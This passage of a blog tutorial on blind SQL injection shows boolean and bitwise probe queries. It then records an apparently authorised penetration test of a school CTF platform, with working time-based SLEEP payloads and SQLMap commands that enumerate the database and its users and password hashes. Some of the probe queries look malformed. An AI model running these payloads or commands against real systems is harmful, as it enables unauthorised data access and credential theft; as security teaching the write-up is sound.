</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>95</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>111</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>119</span><span class=p>;</span><span class=w> </span><span class=c1>--False
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>115</span><span class=p>;</span><span class=w> </span><span class=c1>--False
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>113</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>114</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span></code></pre></div><h4 id=413-an-alternative-implementation-for-bitwise-comparison>4.1.3 An Alternative Implementation for Bitwise Comparison</h4><p>We can also use a bitwise AND approach to confirm each bit of every byte.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&amp;</span><span class=mi>127</span><span class=o>=</span><span class=mi>127</span><span class=p>;</span><span class=w> </span><span class=c1>--False
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&amp;</span><span class=mi>64</span><span class=o>=</span><span class=mi>64</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&amp;</span><span class=mi>32</span><span class=o>=</span><span class=mi>32</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&amp;</span><span class=mi>16</span><span class=o>=</span><span class=mi>16</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&amp;</span><span class=mi>8</span><span class=o>=</span><span class=mi>8</span><span class=p>;</span><span class=w> </span><span class=c1>--False
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&amp;</span><span class=mi>4</span><span class=o>=</span><span class=mi>4</span><span class=p>;</span><span class=w> </span><span class=c1>--False
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&amp;</span><span class=mi>2</span><span class=o>=</span><span class=mi>2</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&amp;</span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=w> </span><span class=c1>--True
</span></span></span></code></pre></div><p>This way, we obtain the first byte of the <code>database()</code> return value as <code>01110011</code>. Looking it up in the ASCII table, we find it corresponds to <code>s</code>.</p><h3 id=42-time-based-blind-sql-injection>4.2 Time-Based Blind SQL Injection</h3><p>When error messages are too simple and lack valuable information, you can consider using time-based SQL injection.</p><p><code>sleep(duration)</code> sleeps (pauses) for the number of seconds specified in the <code>duration</code> argument, and then returns 0. The <code>duration</code> can include a fractional part. If the argument is <code>NULL</code> or negative, it will produce a warning or an error in strict SQL mode.</p><h3 id=43-a-practical-example-of-sql-injection>4.3 A Practical Example of SQL Injection</h3><p>Today (October 16, 2023), after getting authorization from the server administrator, I conducted a penetration test on a self-built CTF competition platform at my school. And here is the record that everything I&rsquo;ve done.</p><h4 id=430-information-gathering>4.3.0 Information Gathering</h4><p>Upon accessing the login page, I observed the following:</p><ul><li>The platform has three user roles, each with different permissions.</li><li>The platform is built using PHP. :)</li></ul><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231016220135085.png data-srcset="./assets/image-20231016220135085.png, ./assets/image-20231016220135085.png 1.5x, ./assets/image-20231016220135085.png 2x" data-sizes=auto alt=./assets/image-20231016220135085.png title=image-20231016220135085></p><p>By examining the source code in the browser&rsquo;s developer mode, I discovered that the CAPTCHA is generated and validated on the front-end. This provided valuable insight for conducting penetration testing on the authentication interface.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// CAPTCHA
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>change</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>code</span> <span class=o>=</span> <span class=err>$</span><span class=p>(</span><span class=s2>&#34;#code&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// CAPTCHA character library
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>var</span> <span class=nx>arrays</span> <span class=o>=</span> <span class=k>new</span> <span class=k>Array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=s1>&#39;2&#39;</span><span class=p>,</span> <span class=s1>&#39;3&#39;</span><span class=p>,</span> <span class=s1>&#39;4&#39;</span><span class=p>,</span> <span class=s1>&#39;5&#39;</span><span class=p>,</span> <span class=s1>&#39;6&#39;</span><span class=p>,</span> <span class=s1>&#39;7&#39;</span><span class=p>,</span> <span class=s1>&#39;8&#39;</span><span class=p>,</span> <span class=s1>&#39;9&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>,</span> <span class=s1>&#39;c&#39;</span><span class=p>,</span> <span class=s1>&#39;d&#39;</span><span class=p>,</span> <span class=s1>&#39;e&#39;</span><span class=p>,</span> <span class=s1>&#39;f&#39;</span><span class=p>,</span> <span class=s1>&#39;g&#39;</span><span class=p>,</span> <span class=s1>&#39;h&#39;</span><span class=p>,</span> <span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=s1>&#39;j&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;k&#39;</span><span class=p>,</span> <span class=s1>&#39;l&#39;</span><span class=p>,</span> <span class=s1>&#39;m&#39;</span><span class=p>,</span> <span class=s1>&#39;n&#39;</span><span class=p>,</span> <span class=s1>&#39;o&#39;</span><span class=p>,</span> <span class=s1>&#39;p&#39;</span><span class=p>,</span> <span class=s1>&#39;q&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=s1>&#39;t&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;u&#39;</span><span class=p>,</span> <span class=s1>&#39;v&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=s1>&#39;x&#39;</span><span class=p>,</span> <span class=s1>&#39;y&#39;</span><span class=p>,</span> <span class=s1>&#39;z&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;A&#39;</span><span class=p>,</span> <span class=s1>&#39;B&#39;</span><span class=p>,</span> <span class=s1>&#39;C&#39;</span><span class=p>,</span> <span class=s1>&#39;D&#39;</span><span class=p>,</span> <span class=s1>&#39;E&#39;</span><span class=p>,</span> <span class=s1>&#39;F&#39;</span><span class=p>,</span> <span class=s1>&#39;G&#39;</span><span class=p>,</span> <span class=s1>&#39;H&#39;</span><span class=p>,</span> <span class=s1>&#39;I&#39;</span><span class=p>,</span> <span class=s1>&#39;J&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;K&#39;</span><span class=p>,</span> <span class=s1>&#39;L&#39;</span><span class=p>,</span> <span class=s1>&#39;M&#39;</span><span class=p>,</span> <span class=s1>&#39;N&#39;</span><span class=p>,</span> <span class=s1>&#39;O&#39;</span><span class=p>,</span> <span class=s1>&#39;P&#39;</span><span class=p>,</span> <span class=s1>&#39;Q&#39;</span><span class=p>,</span> <span class=s1>&#39;R&#39;</span><span class=p>,</span> <span class=s1>&#39;S&#39;</span><span class=p>,</span> <span class=s1>&#39;T
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;U&#39;</span><span class=p>,</span> <span class=s1>&#39;V&#39;</span><span class=p>,</span> <span class=s1>&#39;W&#39;</span><span class=p>,</span> <span class=s1>&#39;X&#39;</span><span class=p>,</span> <span class=s1>&#39;Y&#39;</span><span class=p>,</span> <span class=s1>&#39;Z&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>codes</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span> <span class=c1>// Reinitialize the CAPTCHA
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span> <span class=p>(</span><span class=k>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Randomly select an array index
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>var</span> <span class=nx>r</span> <span class=o>=</span> <span class=nx>parseInt</span><span class=p>(</span><span class=nx>Math</span><span class=o>.</span><span class=nx>random</span><span class=p>()</span> <span class=o>*</span> <span class=nx>arrays</span><span class=o>.</span><span class=nx>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>codes</span> <span class=o>+=</span> <span class=nx>arrays</span><span class=p>[</span><span class=nx>r</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Add the CAPTCHA to the input field
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>code</span><span class=o>.</span><span class=nx>val</span><span class=p>(</span><span class=nx>codes</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>I attempted to log in with a random username and password and observed the HTTP POST request.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/ctf/login1.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/javascript, */*; q=0.01</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>20</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>***.***.**.**:11080</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://***.***.**.**:11080</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://***.***.**.**:11080/ctf/login.php</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>name=1&amp;nuse=2&amp;role=3
</span></span></code></pre></div><p>In the HTTP body, <code>name</code> and <code>nuse</code> correspond to the user&rsquo;s username and password, while <code>role</code> corresponds to the user&rsquo;s role. After testing, I found that <code>role=3</code> corresponds to an observer, <code>role=2</code> corresponds to a participant, and <code>role=1</code> corresponds to a superuser.</p><p>I examined the response to the login request.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Apache/2.4.6 (CentOS) PHP/5.4.16</span>
</span></span><span class=line><span class=cl><span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>PHP/5.4.16</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>30</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=UTF-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;code&#34;:0,&#34;msg&#34;:&#34;error&#34;} 
</span></span></code></pre></div><p>Regardless of whether the authentication succeeds or fails, the server always returns a <code>200 OK</code> status (which again, is a bad design, totally abandoned HTTP status code). When authentication fails, the server returns <code>{"code":0,"msg":"error"}</code>, and there is no indication of login failure in the frontend, no page redirection, and no updates to the HTTP DOM elements. Using a few payloads to test for SQL injection vulnerabilities, it became apparent that even if an SQL injection vulnerability existed, it was <strong>blind</strong> with no direct response. Don&rsquo;t give up; let&rsquo;s consider <strong>blind SQL injection</strong>.</p><h4 id=431-sqlmap-and-time-based-blind-sql-injection>4.3.1 SQLMap and Time-Based Blind SQL Injection</h4><h5 id=4311-identifying-the-injection-point>4.3.1.1 Identifying the Injection Point</h5><p>First, I used SQLMap to test for possible injection points. I used <code>--method</code> to specify the request method and <code>--data</code> to specify the request body. When specifying <code>data</code>, SQLMap automatically assumes an HTTP POST request.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -u http://***.***.**.**:11080/ctf/login1.php --method POST --data<span class=o>=</span><span class=s2>&#34;name=a&amp;nuse=12345&amp;role=2&#34;</span>
</span></span></code></pre></div><p>After a short wait, it was evident that all three parameters were vulnerable to SQL injection. Time-based blind SQL injection was also detected.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>19:59:24<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
</span></span><span class=line><span class=cl>sqlmap identified the following injection point<span class=o>(</span>s<span class=o>)</span> with a total of <span class=m>221</span> HTTP<span class=o>(</span>s<span class=o>)</span> requests:
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl>Parameter: role <span class=o>(</span>POST<span class=o>)</span>
</span></span><span class=line><span class=cl>    Type: time-based blind
</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>name</span><span class=o>=</span>a<span class=p>&amp;</span><span class=nv>nuse</span><span class=o>=</span>12345<span class=p>&amp;</span><span class=nv>role</span><span class=o>=</span>2<span class=s1>&#39; AND (SELECT 1759 FROM (SELECT(SLEEP(5)))bwmO) AND &#39;</span>KgWg<span class=s1>&#39;=&#39;</span>KgWg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Parameter: name <span class=o>(</span>POST<span class=o>)</span>
</span></span><span class=line><span class=cl>    Type: time-based blind
</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>name</span><span class=o>=</span>a<span class=s1>&#39; AND (SELECT 7192 FROM (SELECT(SLEEP(5)))Jjvo) AND &#39;</span>UJWE<span class=s1>&#39;=&#39;</span>UJWE<span class=p>&amp;</span><span class=nv>nuse</span><span class=o>=</span>12345<span class=p>&amp;</span><span class=nv>role</span><span class=o>=</span><span class=m>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Parameter: nuse <span class=o>(</span>POST<span class=o>)</span>
</span></span><span class=line><span class=cl>    Type: time-based blind
</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>name</span><span class=o>=</span>a<span class=p>&amp;</span><span class=nv>nuse</span><span class=o>=</span>12345<span class=s1>&#39; AND (SELECT 4889 FROM (SELECT(SLEEP(5)))uwpB) AND &#39;</span>rbOT<span class=s1>&#39;=&#39;</span>rbOT<span class=p>&amp;</span><span class=nv>role</span><span class=o>=</span><span class=m>2</span>
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl><span class=o>[</span>19:59:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is MySQL
</span></span><span class=line><span class=cl>web server operating system: Linux CentOS <span class=m>7</span>
</span></span><span class=line><span class=cl>web application technology: Apache 2.4.6, PHP 5.4.16
</span></span><span class=line><span class=cl>back-end DBMS: MySQL &gt;<span class=o>=</span> 5.0.12 <span class=o>(</span>MariaDB fork<span class=o>)</span>
</span></span></code></pre></div><p>Let&rsquo;s take a look at the time-based blind injection payloads.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>name</span><span class=o>=</span><span class=n>a</span><span class=o>&amp;</span><span class=n>nuse</span><span class=o>=</span><span class=mi>12345</span><span class=o>&amp;</span><span class=k>role</span><span class=o>=</span><span class=mi>2</span><span class=s1>&#39; AND (SELECT 1759 FROM (SELECT(SLEEP(5)))bwmO) AND &#39;</span><span class=n>KgWg</span><span class=s1>&#39;=&#39;</span><span class=n>KgWg</span><span class=w>
</span></span></span></code></pre></div><p>We can see that the SQL statements on the server are enclosed with <code>'</code>, indicating a character-based injection. SQLMap nestles delay functions like <code>sleep()</code> in the <code>from</code> subquery to delay the server&rsquo;s response.</p><h5 id=4312-identifying-the-database-name>4.3.1.2 Identifying the Database Name</h5><p>I used <code>-current-db</code> to obtain the name of the <strong>currently used</strong> database.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -u http://***.***.**.**:11080/ctf/login1.php --method POST --data<span class=o>=</span><span class=s2>&#34;name=a&amp;nuse=12345&amp;role=2&#34;</span> --current-db
</span></span></code></pre></div><p>The result was quickly obtained.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>20:11:05<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> adjusting <span class=nb>time</span> delay to <span class=m>1</span> second due to good response <span class=nb>times</span>
</span></span><span class=line><span class=cl>cloud
</span></span><span class=line><span class=cl>current database: <span class=s1>&#39;cloud&#39;</span>
</span></span></code></pre></div><p>We can also use <code>--dbs</code> to enumerate all database names.</p><h5 id=4313-identifying-database-users-passwords-and-privileges>4.3.1.3 Identifying Database Users, Passwords, and Privileges</h5><p>I used <code>--users</code>, <code>--passwords</code>, and <code>--privileges</code> to enumerate database users, passwords, and privileges.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -u http://***.***.**.**:11080/ctf/login1.php --method POST --data<span class=o>=</span><span class=s2>&#34;name=a&amp;nuse=12345&amp;role=2&#34;</span> --users --passwords --privileges
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>21:12:56<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=s1>&#39;my&#39;</span>@<span class=s1>&#39;localhost&#39;</span>
